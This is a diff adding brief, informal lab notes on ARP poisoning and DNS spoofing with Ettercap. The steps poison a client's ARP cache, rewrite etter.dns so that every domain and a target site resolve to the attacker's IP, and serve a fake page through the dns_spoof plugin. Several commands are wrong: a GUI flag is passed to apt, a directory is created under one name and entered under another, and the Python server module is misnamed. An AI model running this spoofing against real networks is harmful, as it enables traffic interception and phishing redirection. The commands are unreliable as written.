@@ -1,0 +1,45 @@
+ETTERCAP (ARP SPOOFING and DNS SPOOFING)
+
+
+Sudo apt install ettercap -G
+
+Sudo ettercap -G
+
+Click right , three dots -> Host -scan for host ->
+
+
+Client:
+arp -a --------- see MAC address
+
+KALI:
+
+Ettercap - host list - earth symbol - arp poisoning -OK 
+
+
+Client:
+Arp -a -----------all Mac same
+
+To stop click stop
+
+
+KALI
+Vim /etc/ettercap/etter.dns
+
+
+	*	A 	<self ip >
+	website_name which we want to spoof	A	<self ip>
+
+
+mkdir xcx
+Cd xyzzy
+cat>index.html 
+	hjjhijijj
+Python3 -m http-server --bind <self ip> 80
+
+
+KALI:
+Sudo ettercap -G
+
+Three dots - manage plugins double click dns spoofing (*)
+
+We will get same page that we created 
